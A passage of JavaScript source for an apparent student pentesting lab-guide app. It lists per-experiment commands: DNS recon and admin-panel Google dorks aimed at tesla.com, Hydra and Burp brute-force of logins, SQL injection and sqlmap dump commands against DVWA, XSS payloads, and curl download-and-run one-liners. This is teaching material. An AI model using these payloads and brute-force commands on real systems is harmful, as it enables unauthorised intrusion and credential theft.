Dig\",\n            desc: \"Directly query A, authoritative Name Servers (NS), and Mail Exchange (MX) records:\",\n            notes: [],\n            cmds: [\n              \"dig tesla.com\",\n              \"dig +short NS tesla.com\",\n              \"dig +short MX tesla.com\"\n            ]\n          },\n          {\n            heading: \"Step 4: Discovering Login Interfaces using Google Dorking\",\n            desc: \"Use advanced search operators in Google to locate exposed admin panels and login forms:\",\n            notes: [\n              \"inurl: (keyword in URL) | intitle: (keyword in page title)\",\n              \"filetype: (specific file extension) | site: (restrict to domain) | intext: (keyword in body)\"\n            ],\n            cmds: [\n              \"inurl:admin site:tesla.com\",\n              \"intitle:\\\"login\\\" site:tesla.com\",\n              \"inurl:login site:testphp.vulnweb.com\",\n              \"filetype:php inurl:admin\",\n              \"site:github.com inurl:login\"\n            ]\n          }\n        ],\n        cmdsOnly: [\n          \"sudo apt update && sudo apt install -y dnsutils dnsrecon theharvester\",\n          \"curl -sL https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -o subdomains.txt\",\n          \"dnsrecon -d tesla.com\",\n          \"dnsrecon -d tesla.com -t std --xml tesla_dns.xml\",\n          \"dnsrecon -d tesla.com -t brt -D subdomains.txt\",\n          \"theHarvester -d tesla.com -b bing\",\n          \"dig tesla.com\\ndig +short NS tesla.com\\ndig +short MX tesla.com\",\n          \"inurl:admin site:tesla.com\\nintitle:\\\"login\\\" site:tesla.com\\ninurl:login site:testphp.vulnweb.com\\nfiletype:php inurl:admin\\nsite:github.com inurl:login\"\n        ],\n        observations: [\n          \"Discovered subdomains (shop.tesla.com, energy.tesla.com) via theHarvester and confirmed them with DNSRecon.\",\n          \"Dig and DNSRecon mapped Tesla's authoritative NS and MX mail servers.\",\n          \"Google dorks revealed public login pages on testphp.vulnweb.com.\"\n        ]\n      },\n      {\n        id: 5,\n        short: \"WPScan, ZAP & Hydra (P4)\",\n        title: \"Exp 5 (Practical 4): Web App Testing using WPScan, OWASP ZAP, NVD & Hydra\",\n        aim: \"Identify known vulnerabilities, CVEs, misconfigurations, and weak login credentials in a WordPress application using WPScan, NVD, OWASP ZAP, and Hydra.\",\n        target: \"http://<target-ip> (WordPress VM)\",\n        tools: \"WPScan, OWASP ZAP, Hydra, NVD (https://nvd.nist.gov/)\",\n        steps: [\n          {\n            heading: \"Core Vulnerability Definitions (NVD, CVE, CWE)\",\n            desc: \"Key vulnerability classification standards used in this experiment:\",\n            notes: [\n              \"NVD (National Vulnerability Database): U.S. government repository of CVEs with CVSS severity scores, affected products, and mitigation steps (https://nvd.nist.gov/).\",\n              \"CVE (Common Vulnerabilities and Exposures): Unique identifier assigned to a specific vulnerability (e.g., CVE-2024-12345).\",\n              \"CWE (Common Weakness Enumeration): Classification of software flaw categories (e.g., CWE-79 = Cross-Site Scripting, CWE-89 = SQL Injection).\"\n            ],\n            cmds: []\n          },\n          {\n            heading: \"Step 1: Scan WordPress with WPScan\",\n            desc: \"Enumerate WordPress usernames (u), vulnerable plugins (vp), and vulnerable themes (vt):\",\n            notes: [],\n            cmds: [\n              \"wpscan --url http://<target-ip> --enumerate u,vp,vt\"\n            ]\n          },\n          {\n            heading: \"Step 2: Validate Discovered CVEs in NVD\",\n            desc: \"Search plugin and theme CVE IDs reported by WPScan in https://nvd.nist.gov/ and record CVSS severity scores and fix status.\",\n            notes: [],\n            cmds: []\n          },\n          {\n            heading: \"Step 3: Spider & Scan with OWASP ZAP\",\n            desc: \"Configure browser proxy to 127.0.0.1:8080 and crawl/scan the target:\",\n            notes: [\n              \"Traditional Spider: Fast; discovers links from static HTML responses.\",\n              \"AJAX Spider: Uses a real browser to render JavaScript-heavy applications.\",\n              \"Passive Scanning: Non-intrusive monitoring of HTTP traffic without modifying requests.\",\n              \"Active Scanning: Actively probes with attack payloads to find XSS, SQL Injection, missing security headers, and insecure cookies.\"\n            ],\n            cmds: [\"zaproxy &\"]\n          },\n          {\n            heading: \"Step 4: Brute-Force WordPress Login with Hydra\",\n            desc: \"Deduplicate the wordlist (fsocity.dic) or use rockyou.txt to brute-force /wp-login.php:\",\n            notes: [\n              \"Syntax: hydra -l <user> -P <wordlist> <target-ip> http-post-form \\\"<path>:<POST-body>:F=<failure-string>\\\"\"\n            ],\n            cmds: [\n              \"sort fsocity.dic | uniq > fsocity.dic.uniq\",\n              \"hydra -L /usr/share/wordlists/rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'\",\n              \"hydra -l elliot -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'\"\n            ]\n          }\n        ],\n        cmdsOnly: [\n          \"wpscan --url http://<target-ip> --enumerate u,vp,vt\",\n          \"zaproxy &\",\n          \"sort fsocity.dic | uniq > fsocity.dic.uniq\",\n          \"hydra -L /usr/share/wordlists/rockyou.txt -p blah <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'\",\n          \"hydra -l elliot -P /usr/share/wordlists/rockyou.txt <target-ip> http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid password'\"\n        ],\n        observations: [\n          \"WPScan identified outdated plugins and valid WordPress usernames.\",\n          \"NVD confirmed CVSS severity scores for the discovered plugin CVEs.\",\n          \"OWASP ZAP flagged missing security headers and XSS vectors; Hydra cracked the login credentials.\"\n        ]\n      },\n      {\n        id: 6,\n        short: \"Juice Shop (P5)\",\n        title: \"Exp 6 (Practical 5): Auth, Authorization & Identity Flaws in OWASP Juice Shop\",\n        aim: \"Evaluate authentication, authorization, account enumeration, default credentials, Burp Intruder brute-force, lockout, browser cache, and OSINT password reset flaws in OWASP Juice Shop.\",\n        target: \"http://127.0.0.1:42000\",\n        tools: \"OWASP Juice Shop, Burp Suite (Proxy & Intruder), Firefox\",\n        steps: [\n          {\n            heading: \"Environment Setup & Firefox Localhost Proxy Fix\",\n            desc: \"Launch Juice Shop and allow Firefox to route localhost (127.0.0.1) traffic through Burp Suite (127.0.0.1:8080):\",\n            notes: [\n              \"In Firefox address bar, open about:config and click Accept the Risk.\",\n              \"Search network.proxy.allow_hijacking_localhost and toggle it from false to true.\"\n            ],\n            cmds: [\n              \"sudo apt update && sudo apt install -y juice-shop && sudo juice-shop\",\n              \"# Or via Docker on Ubuntu:\\nsudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop\",\n              \"about:config -> network.proxy.allow_hijacking_localhost = true\"\n            ]\n          },\n          {\n            heading: \"Step 1 & 2: Role Definitions, Registration & Account Enumeration\",\n            desc: \"Test access controls, registration validation, and email leakage:\",\n            notes: [\n              \"Log in as a normal user and browse to /administration (confirm 403 Forbidden).\",\n              \"Test registration with invalid emails, short passwords, and special characters.\",\n              \"Inspect product reviews (e.g., Green Smoothie) to harvest exposed user emails (jim@juice-sh.op, admin@juice-sh.op).\"\n            ],\n            cmds: []\n          },\n          {\n            heading: \"Step 3: Default Credentials & Brute-Force with Burp Intruder\",\n            desc: \"Configure Burp Suite Intruder for Cluster Bomb (credential stuffing) & Sniper (password brute-force):\",\n            notes: [\n              \"Intercept a POST login request -> Right-click -> Send to Intruder -> Click Clear §.\",\n              \"Highlight username and password values and click Add § on each.\",\n              \"Set Attack Type to Cluster Bomb (tries every username + password combination).\",\n              \"IMPORTANT: In Payloads tab -> scroll to Payload Encoding -> uncheck/remove '.' (dot) so @juice-sh.op is not mangled.\",\n              \"Click Start Attack and look for HTTP 200 OK or 302 with a different response length (admin@juice-sh.op : admin123).\"\n            ],\n            cmds: [\n              \"username=§USERNAME§&password=§PASSWORD§\",\n              \"# Payload Set 1 (9 Usernames):\\nadmin@juice-sh.op\\nadministrator@juice-sh.op\\nroot@juice-sh.op\\nuser@juice-sh.op\\ntest@juice-sh.op\\nguest@juice-sh.op\\nmanager@juice-sh.op\\nsupport@juice-sh.op\\nsecurity@juice-sh.op\",\n              \"# Payload Set 2 (6 Passwords):\\nadmin\\npassword\\n123456\\njuice\\nwelcome\\nadmin123\"\n            ]\n          },\n          {\n            heading: \"Step 4: Weak Lockout, Browser Cache & OSINT Password Reset\",\n            desc: \"Test post-authentication and account recovery controls:\",\n            notes: [\n              \"Weak Lockout: Attempt 10+ wrong passwords in a row -> verify no account lockout, delay, or CAPTCHA.\",\n              \"Browser Cache: Log in -> open Profile/Order History -> Log out -> press Browser Back button to check if sensitive pages remain cached.\",\n              \"Jim's Password Reset (OSINT): Jim's Green Smoothie review mentions 'replicator' (Star Trek -> Captain James T. Kirk). On Forgot Password for jim@juice-sh.op, answer 'Your eldest brother's middle name?' with Samuel (George Samuel Kirk).\"\n            ],\n            cmds: [\n              \"Email: jim@juice-sh.op\\nSecurity Answer: Samuel\"\n            ]\n          }\n        ],\n        cmdsOnly: [\n          \"sudo apt update && sudo apt install -y juice-shop && sudo juice-shop\",\n          \"sudo docker run --rm -d -p 42000:3000 --name juice-shop bkimminich/juice-shop\",\n          \"about:config -> network.proxy.allow_hijacking_localhost = true\",\n          \"username=§USERNAME§&password=§PASSWORD§\",\n          \"admin@juice-sh.op\\nadministrator@juice-sh.op\\nroot@juice-sh.op\\nuser@juice-sh.op\\ntest@juice-sh.op\\nguest@juice-sh.op\\nmanager@juice-sh.op\\nsupport@juice-sh.op\\nsecurity@juice-sh.op\",\n          \"admin\\npassword\\n123456\\njuice\\nwelcome\\nadmin123\",\n          \"jim@juice-sh.op -> Security Answer: Samuel\"\n        ],\n        observations: [\n          \"Burp Intruder Cluster Bomb identified valid credentials (admin@juice-sh.op : admin123) via HTTP 200 status and response length.\",\n          \"No account lockout triggered after 10+ failed login attempts.\",\n          \"OSINT from product reviews allowed resetting Jim's password using 'Samuel'.\"\n        ]\n      },\n      {\n        id: 7,\n        short: \"DVWA SQLi (P6)\",\n        title: \"Exp 7 (Practical 6): SQL Injection & Blind SQL Injection in DVWA\",\n        aim: \"Demonstrate Classic SQL Injection (UNION-based) and Blind SQL Injection (Boolean-based & automated SQLMap) in DVWA set to Low Security.\",\n        target: \"http://localhost/DVWA (Login: admin / password, Security: Low)\",\n        tools: \"DVWA, SQLMap, Browser / Burp Suite\",\n        steps: [\n          {\n            heading: \"Step 1–4: Install DVWA & Set Security to Low\",\n            desc: \"Install DVWA via the official one-liner script (or Docker), log in with admin / password, click Create/Reset Database, and set DVWA Security to Low:\",\n            notes: [\n              \"Theory note: SQL evaluates AND before OR, so trailing '--' or '#' comments out 'AND password = ...' to make 'OR 1=1' always true.\"\n            ],\n            cmds: [\n              \"sudo bash -c \\\"$(curl --fail --show-error --silent --location https://raw.githubusercontent.com/IamCarron/DVWA-Script/main/Install-DVWA.sh)\\\"\",\n              \"# Or via Docker:\\nsudo docker run --rm -d -p 80:80 --name dvwa vulnerables/web-dvwa\"\n            ]\n          },\n          {\n            heading: \"Part A (Steps 5–8): Classic SQL Injection (Visible Output)\",\n            desc: \"Open Vulnerabilities -> SQL Injection and enter these payloads in the User ID box:\",\n            notes: [\n              \"Step 5: Trigger SQL syntax error with 1'\",\n              \"Step 6: Bypass authentication and return all rows with 1' OR '1'='1\",\n              \"Step 7: Extract database version using UNION SELECT\",\n              \"Step 8: Enumerate tables and columns from information_schema, then dump users\"\n            ],\n            cmds: [\n              \"1'\",\n              \"1' AND 1=2 #\",\n              \"1' OR '1'='1\",\n              \"1' UNION SELECT null, version() #\",\n              \"1' UNION SELECT null, table_name FROM information_schema.tables #\",\n              \"1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #\",\n              \"1' UNION SELECT user, password FROM users #\"\n            ]\n          },\n          {\n            heading: \"Part B (Steps 9–12): Manual Blind SQL Injection\",\n            desc: \"Open Vulnerabilities -> SQL Injection (Blind) and test boolean responses (User ID exists vs MISSING):\",\n            notes: [\n              \"Step 11: Compare True (1=1) vs False (1=2) behavior.\",\n              \"Step 12: Test if the 1st character of database() is 'd' (for 'dvwa').\"\n            ],\n            cmds: [\n              \"1'\",\n              \"1' AND 1=1 #\",\n              \"1' AND 1=2 #\",\n              \"1' AND SUBSTRING(database(),1,1)='d' #\"\n            ]\n          },\n          {\n            heading: \"Steps 13 & 14: Automated Blind SQLi with SQLMap\",\n            desc: \"Copy your PHPSESSID cookie from Burp Suite or Browser DevTools (F12 -> Storage -> Cookies) and run SQLMap:\",\n            notes: [\n              \"--dbs lists databases | -D dvwa --tables lists tables | -T users --dump extracts users and cracks MD5 hashes (admin:password, gordonb:abc123).\"\n            ],\n            cmds: [\n              \"sqlmap --url=\\\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\\\" --cookie=\\\"PHPSESSID=YOUR_COOKIE; security=low\\\" --dbs --batch\",\n              \"sqlmap --url=\\\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\\\" --cookie=\\\"PHPSESSID=YOUR_COOKIE; security=low\\\" -p id -D dvwa --tables --batch --threads 5\",\n              \"sqlmap --url=\\\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\\\" --cookie=\\\"PHPSESSID=YOUR_COOKIE; security=low\\\" -D dvwa -T users --dump --batch --threads 5\"\n            ]\n          }\n        ],\n        cmdsOnly: [\n          \"1'\",\n          \"1' AND 1=2 #\",\n          \"1' OR '1'='1\",\n          \"1' UNION SELECT null, version() #\",\n          \"1' UNION SELECT null, table_name FROM information_schema.tables #\",\n          \"1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' #\",\n          \"1' UNION SELECT user, password FROM users #\",\n          \"1' AND 1=1 #\\n1' AND 1=2 #\\n1' AND SUBSTRING(database(),1,1)='d' #\",\n          \"sqlmap --url=\\\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\\\" --cookie=\\\"PHPSESSID=YOUR_COOKIE; security=low\\\" --dbs --batch\",\n          \"sqlmap --url=\\\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\\\" --cookie=\\\"PHPSESSID=YOUR_COOKIE; security=low\\\" -p id -D dvwa --tables --batch --threads 5\",\n          \"sqlmap --url=\\\"http://localhost/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit#\\\" --cookie=\\\"PHPSESSID=YOUR_COOKIE; security=low\\\" -D dvwa -T users --dump --batch --threads 5\"\n        ],\n        observations: [\n          \"Classic SQLi retrieved the MySQL/MariaDB version, table list, and users table records directly.\",\n          \"SQLMap automated Blind SQLi, identifying dvwa and information_schema and cracking MD5 password hashes (admin:password, gordonb:abc123).\"\n        ]\n      },\n      {\n        id: 8,\n        short: \"DVWA XSS (P7)\",\n        title: \"Exp 8 (Practical 7): Client-Side Testing (HTML Injection & XSS in DVWA)\",\n        aim: \"Demonstrate HTML Injection, JavaScript Execution, Cookie Theft, and Reflected, DOM-Based, and Stored XSS in DVWA (Low Security).\",\n        target: \"http://localhost/dvwa/ (Login: admin / password, Security: Low)\",\n        tools: \"DVWA, Web Browser (Firefox / Chrome)\",\n        steps: [\n          {\n            heading: \"Step 1 & 2: Setup DVWA & HTML Injection\",\n            desc: \"Set DVWA Security to Low -> Open Vulnerabilities -> XSS (Stored) -> enter raw HTML in the Message field and click Sign Guestbook:\",\n            notes: [\n              \"Alters visual page structure without executing JavaScript.\"\n            ],\n            cmds: [\n              \"<h1>Website Defaced by Student</h1>\"\n            ]\n          },\n          {\n            heading: \"Step 3: JavaScript Execution & Cookie Theft\",\n            desc: \"In XSS (Stored), inject script payloads to execute JS and expose session cookies (if input length is capped, right-click -> Inspect -> increase maxlength):\",\n            notes: [],\n            cmds: [\n              \"<script>alert('JavaScript Executed!')<\\/script>\",\n              \"<script>alert('Cookies: ' + document.cookie)<\\/script>\"\n            ]\n          },\n          {\n            heading: \"Step 4: Reflected XSS (Non-Persistent)\",\n            desc: \"Navigate to Vulnerabilities -> XSS (Reflected), submit the payload, and click the rendered button:\",\n            notes: [],\n            cmds: [\n              \"<button onclick=\\\"alert('1')\\\">Click Me!</button>\"\n            ]\n          },\n          {\n            heading: \"Step 5: DOM-Based XSS\",\n            desc: \"Navigate to Vulnerabilities -> XSS (DOM), select a language, and modify the default= parameter directly in the URL bar:\",\n            notes: [\n              \"Executes directly in the browser DOM without server-side reflection.\"\n            ],\n            cmds: [\n              \"http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')<\\/script>\"\n            ]\n          },\n          {\n            heading: \"Step 6: Stored XSS (Compact Event Handler) & Filter-Bypass Payloads\",\n            desc: \"In XSS (Stored), submit a compact event handler payload (<div onmouseover=...>) and test alternative filter-bypass vectors:\",\n            notes: [\n              \"onmouseover: triggers when cursor hovers over element\",\n              \"onerror: triggers when image source fails to load\",\n              \"onfocus + autofocus: triggers immediately when input gains focus\",\n              \"onload: triggers when body/element finishes loading\"\n            ],\n            cmds: [\n              \"<div onmouseover=alert(1)>Hover</div>\",\n              \"<img src=x onmouseover=alert('XSS')>\",\n              \"<img src=invalidImage onerror=alert('XSS')>\",\n              \"<input autofocus onfocus=alert('XSS')>\",\n              \"<body onload=alert('XSS')>\",\n              \"<a href=\\\"javascript:alert('XSS')\\\">Click Me</a>\",\n              \"<iframe src=\\\"javascript:alert('Iframe XSS')\\\"></iframe>\"\n            ]\n          }\n        ],\n        cmdsOnly: [\n          \"<h1>Website Defaced by Student</h1>\",\n          \"<script>alert('JavaScript Executed!')<\\/script>\",\n          \"<script>alert('Cookies: ' + document.cookie)<\\/script>\",\n          \"<button onclick=\\\"alert('1')\\\">Click Me!</button>\",\n          \"http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')<\\/script>\",\n          \"<div onmouseover=alert(1)>Hover</div>\",\n          \"<img src=x onmouseover=alert('XSS')>\\n<img src=invalidImage onerror=alert('XSS')>\\n<input autofocus onfocus=alert('XSS')>\\n<body onload=alert('XSS')>\\n<a href=\\\"javascript:alert('XSS')\\\">Click Me</a>\\n<iframe src=\\\"javascript:alert('Iframe XSS')\\\"></iframe>\"\n        ],\n        observations: [\n          \"HTML Injection altered the guestbook layout visually.\",\n          \"JavaScript execution exposed PHPSESSID and security=low cookies via document.cookie.\",\n          \"Reflected, DOM-Based, and Stored XSS payloads executed inside the browser context.\"\n        ]\n      }\n    ];\n\n    const state = {\n      expId: Number(localStorage.getItem(\"s7_exp\") || 1),\n      mode: localStorage.getItem(\"s7_mode\") || \"full\",\n      scale: Number(localStorage.getItem(\"s7_scale\") || 1),\n      theme: localStorage.getItem(\"s7_theme\") || \"dark\",\n      searchQuery: \"\",\n      chatHistory: JSON.parse(localStorage.getItem(\"s7_chat\") || \"[]\")\n    };\n\n    const originUrl = window.location.origin.startsWith(\"http\")\n      ? window.location.origin\n      : \"https://arxec-lab.vercel.app\";\n\n    function escapeHtml(str) {\n      return String(str)\n        .replace(/&/g, \"&amp;\")\n        .replace(/</g, \"&lt;\")\n        .replace(/>/g, \"&gt;\")\n        .replace(/\"/g, \"&quot;\");\n    }\n\n    function applyPrefs() {\n      document.documentElement.setAttribute(\"data-theme\", state.theme);\n      document.documentElement.style.setProperty(\"--user-scale\", String(state.scale));\n      document.getElementById(\"themeLabel\").textContent = state.theme === \"dark\" ? \"Day\" : \"Night\";\n      localStorage.setItem(\"s7_theme\", state.theme);\n      localStorage.setItem(\"s7_scale\", String(state.scale));\n      localStorage.setItem(\"s7_exp\", String(state.expId));\n      localStorage.setItem(\"s7_mode\", state.mode);\n    }\n\n    function renderExpStrip() {\n      const strip = document.getElementById(\"expStrip\");\n      strip.innerHTML = EXPERIMENTS.map((e) => {\n        const active = (state.mode === \"full\" || state.mode === \"cmds\") && e.id === state.expId;\n        return `<button type=\"button\" class=\"exp-pill\" aria-pressed=\"${active}\" data-exp=\"${e.id}\">\n          <span class=\"num\">#${e.id}</span><span>${escapeHtml(e.short)}</span>\n        </button>`;\n      }).join(\"\");\n\n      strip.querySelectorAll(\".exp-pill\").forEach((btn) => {\n        btn.addEventListener(\"click\", () => {\n          state.expId = Number(btn.getAttribute(\"data-exp\"));\n          if (state.mode !== \"full\" && state.mode !== \"cmds\") state.mode = \"full\";\n          render();\n          window.scrollTo({ top: 0, behavior: \"smooth\" });\n        });\n      });\n    }\n\n    function renderModeTabs() {\n      document.querySelectorAll(\".mode-btn\").forEach((btn) => {\n        const m = btn.getAttribute(\"data-mode\");\n        btn.setAttribute(\"aria-selected\", String(m === state.mode));\n      });\n    }\n\n    function renderCmdBox(cmdText) {\n      const encoded = encodeURIComponent(cmdText);\n      const formatted = escapeHtml(cmdText)\n        .split(\"\\n\")\n        .map((line) => line.trim().startsWith(\"#\") ? `<span class=\"comment\">${line}</span>` : line)\n        .join(\"\\n\");\n      return `<div class=\"cmd-box\">\n        <pre class=\"cmd-code\">${formatted}</pre>\n        <button type=\"button\" class=\"copy-btn\" data-copy=\"${encoded}\">Copy</button>\n      </div>`;\n    }\n\n    function bindCopyButtons(container) {\n      container.querySelectorAll(\".copy-btn\").forEach((btn) => {\n        btn.addEventListener(\"click\", async () => {\n          const raw = decodeURIComponent(btn.getAttribute(\"data-copy\") || \"\");\n          try {\n            await navigator.clipboard.writeText(raw);\n          } catch (_) {\n            const ta = document.createElement(\"textarea\");\n            ta.value = raw;\n            document.body.appendChild(ta);\n            ta.select();\n            document.execCommand(\"copy\");\n            ta.remove();\n          }\n          btn.setAttribute(\"data-copied\", \"true\");\n          btn.textContent = \"Copied\";\n          setTimeout(() => {\n            btn.removeAttribute(\"data-copied\");\n            btn.textContent = \"Copy\";\n          }, 1400);\n        });\n      });\n    }\n\n    function renderExperimentView() {\n      const exp = EXPERIMENTS.find((x) => x.id === state.expId) || EXPERIMENTS[0];\n      const prevId = exp.id > 1 ? exp.id - 1 : 8;\n      const nextId = exp.id < 8 ? exp.id + 1 : 1;\n      const prevExp = EXPERIMENTS.find((x) => x.id === prevId);\n      const nextExp = EXPERIMENTS.find((x) => x.id === nextId);\n\n      let bodyHtml = \"\";\n      if (state.mode === \"cmds\") {\n        bodyHtml = `<section class=\"step-block\">\n          <h2 class=\"step-heading\">Commands-Only Mode (./s7 c ${exp.id})</h2>\n          <p class=\"step-desc\">Tap Copy on any block or switch to Full Guide for step-by-step explanations.</p>\n          <div class=\"cmd-group\">\n            ${exp.cmdsOnly.map((c) => renderCmdBox(c)).join(\"\")}\n          </div>\n        </section>`;\n      } else {\n        bodyHtml = `<div class=\"step-list\">\n          ${exp.steps.map((st) => `\n            <section class=\"step-block\">\n              <h2 class=\"step-heading\">${escapeHtml(st.heading)}</h2>\n              ${st.desc ? `<p class=\"step-desc\">${escapeHtml(st.desc)}</p>` : \"\"}\n              ${st.notes && st.notes.length ? `<ul class=\"step-notes\">${st.notes.map((n) => `<li>${escapeHtml(n)}</li>`).join(\"\")}</ul>` : \"\"}\n              ${st.cmds && st.cmds.length ? `<div class=\"cmd-group\">${st.cmds.map((c) => renderCmdBox(c)).join(\"\")}</div>` : \"\"}\n            </section>\n          `).join(\"\")}\n        </div>\n        <aside class=\"obs-box\">\n          <h2 class=\"obs-title\">Observations &amp; Result</h2>\n          <ul class=\"step-notes\">\n            ${exp.observations.map((o) => `<li>${escapeHtml(o)}</li>`).join(\"\")}\n          </ul>\n        </aside>`;\n      }\n\n      return `\n        <article>\n          <header class=\"exp-header\">\n            <h1 class=\"exp-title\">${escapeHtml(exp.title)}</h1>\n            <div class=\"exp-meta\">\n              <span><strong>Target:</strong> ${escapeHtml(exp.target)}</span>\n              <span><strong>Tools:</strong> ${escapeHtml(exp.tools)}</span>\n            </div>\n            <p class=\"exp-aim\">${escapeHtml(exp.aim)}</p>\n          </header>\n          ${bodyHtml}\n          <nav class=\"pager-row\" aria-label=\"Adjacent experiments\">\n            <button type=\"button\" class=\"pager-btn prev\" data-goto=\"${prevId}\">\n              <span>← Exp ${prevId}</span>\n              <span class=\"sub\">${escapeHtml(prevExp.short)}</span>\n            </button>\n            <button type=\"button\" class=\"pager-btn next\" data-goto=\"${nextId}\">\n              <span>Exp ${nextId} →</span>\n              <span class=\"sub\">${escapeHtml(nextExp.short)}</span>\n            </button>\n          </nav>\n        </article>\n      `;\n    }\n\n    function renderSearchView() {\n      const q = state.searchQuery.trim().toLowerCase();\n      let resultsHtml = \"\";\n      if (q) {\n        const matches = EXPERIMENTS.filter((e) =>\n          JSON.stringify(e).toLowerCase().includes(q)\n        );\n        if (matches.length === 0) {\n          resultsHtml = `<p class=\"step-desc\">No matches found for \"${escapeHtml(state.searchQuery)}\".</p>`;\n        } else {\n          resultsHtml = `<div class=\"step-list\">${matches.map((m) => `\n            <section class=\"step-block\">\n              <h2 class=\"step-heading\">${escapeHtml(m.title)}</h2>\n              <p class=\"step-desc\">${escapeHtml(m.aim)}</p>\n              <div class=\"cmd-group\">${m.cmdsOnly.slice(0, 3).map((c) => renderCmdBox(c)).join(\"\")}</div>\n              <div style=\"margin-top:0.65rem\">\n                <button type=\"button\" class=\"icon-btn open-exp-btn\" data-open=\"${m.id}\">Open Exp ${m.id} →</button>\n              </div>\n            </section>\n          `).join(\"\")}</div>`;\n        }\n      } else {\n        resultsHtml = `<p class=\"step-desc\">Search offline across all 8 experiments (e.g., hydra, sqlmap, Samuel, gobuster, dork, xss).</p>`;\n      }\n\n      return `\n        <section class=\"pane-box\">\n          <h1 class=\"exp-title\" style=\"margin-bottom:0.65rem\">Offline Keyword Search (./s7 s)</h1>\n          <div class=\"input-row\">\n            <input type=\"search\" id=\"searchInput\" class=\"term-input\" value=\"${escapeHtml(state.searchQuery)}\" placeholder=\"Search tool, flag, or payload...\" />\n            <button type=\"button\" id=\"searchBtn\" class=\"action-btn\">Find</button>\n          </div>\n          ${resultsHtml}\n        </section>\n      `;\n    }\n\n    function renderAiView() {\n      const msgs = state.chatHistory.length\n        ? state.chatHistory.map((m) => `<div class=\"chat-msg ${m.role === \"user\" ? \"user\" : \"bot\"}\">${escapeHtml(m.role === \"user\" ? `you> ${m.content}` : m.content)}</div>`).join(\"\")\n        : `<div class=\"chat-msg bot\">AI Assistant ready (Lab RAG context for Exp 1–8 active). Ask any question about commands, flags, or viva theory.</div>`;\n\n      return `\n        <section class=\"pane-box\">\n          <div style=\"display:flex;justify-content:space-between;align-items:center;margin-bottom:0.65rem;gap:0.5rem\">\n            <h1 class=\"exp-title\" style=\"margin-bottom:0\">AI Lab Chat (./s7 ai)</h1>\n            <button type=\"button\" id=\"clearChatBtn\" class=\"icon-btn\">Clear</button>\n          </div>\n          <div class=\"input-row\">\n            <input type=\"text\" id=\"aiInput\" class=\"term-input\" placeholder=\"Ask about Exp ${state.expId} or any command...\" />\n            <button type=\"button\" id=\"aiSendBtn\" class=\"action-btn\">Ask</button>\n          </div>\n          <div class=\"chat-log\" id=\"chatLog\">${msgs}</div>\n        </section>\n      `;\n    }\n\n    function renderCurlView() {\n      const cmds = [\n        `# 1. Ubuntu / Linux — Download & Run Interactive CLI:\\ncurl -sL ${originUrl}/s7 -o s7 && chmod +x s7 && ./s7`,\n        `# 2. Quick Cheat Sheet in Terminal:\\ncurl -sL ${originUrl}`,\n        `# 3. Direct Experiment Output without downloading:\\ncurl -sL ${originUrl}/7`,\n        `# 4. Direct AI Question from Terminal:\\ncurl -sL ${originUrl}/ask -d \"give me the hydra command for exp 5\"`,\n        `# 5. Windows PowerShell:\\nirm ${originUrl}/s7.ps1 -OutFile s7.ps1; .\\\\s7.ps1`\n      ];\n      return `\n        <section class=\"pane-box\">\n          <h1 class=\"exp-title\" style=\"margin-bottom:0.5rem\">Terminal &amp; Laptop One-Liners</h1>\n          <p class=\"step-desc\">Copy these commands for your lab machine or share with friends:</p>\n          <div class=\"cmd-group\">\n            ${cmds.map((c) => renderCmdBox(c)).join(\"\")}\n          </div>\n        </section>\n      `;\n    }\n\n    async function askServerAi(question) {\n      const q = question.trim();\n      if (!q) return;\n      if (q.toLowerCase() === \"clear\" || q.toLowerCase() === \"/clear\") {\n        state.chatHistory = [];\n        localStorage.setItem(\"s7_chat\", \"[]\");\n        render();\n        return;\n      }\n      state.chatHistory.push({ role: \"user\", content: q });\n      state.chatHistory.push({ role: \"assistant\", content: \"Thinking...\" });\n      render();\n\n      try {\n        const resp = await fetch(`${originUrl}/api/chat`, {\n          method: \"POST\",\n          headers: { \"Content-Type\": \"application/json\", \"X-Exp\": String(state.expId) },\n          body: JSON.stringify({\n            prompt: q,\n            exp: state.expId,\n            history: state.chatHistory.slice(0, -1).slice(-8)\n          })\n        });\n        const data = await resp.json();\n        state.chatHistory[state.chatHistory.length - 1] = {\n          role: \"assistant\",\n          content: data.reply || data.error || \"No response received.\"\n        };\n      } catch (err) {\n        state.chatHistory[state.chatHistory.length - 1] = {\n          role: \"assistant\",\n          content: \"Offline or unreachable right now. All 8 experiments in Full Guide, Cmds Only, and Search still work 100% offline.\"\n        };\n      }\n      localStorage.setItem(\"s7_chat\", JSON.stringify(state.chatHistory.slice(-16)));\n      render();\n    }\n\n    function render() {\n      applyPrefs();\n      renderExpStrip();\n      renderModeTabs();\n\n      const pathEl = document.getElementById(\"promptPath\");\n      const bottomPrompt = document.getElementById(\"bottomPrompt\");\n      if (state.mode === \"full\" || state.mode === \"cmds\") {\n        pathEl.textContent = `:~/exp${state.expId}${state.mode === \"cmds\" ? \" (cmds)\" : \"\"}`;\n        bottomPrompt.textContent = `s7 (${state.expId})>`;\n      } else {\n        pathEl.textContent = `:~/s7-${state.mode}`;\n        bottomPrompt.textContent = `s7 (${state.mode})>`;\n      }\n\n      const main = document.getElementById(\"mainViewport\");\n      if (state.mode === \"search\") main.innerHTML = renderSearchView();\n      else if (state.mode === \"ai\") main.innerHTML = renderAiView();\n      else if (state.mode === \"curl\") 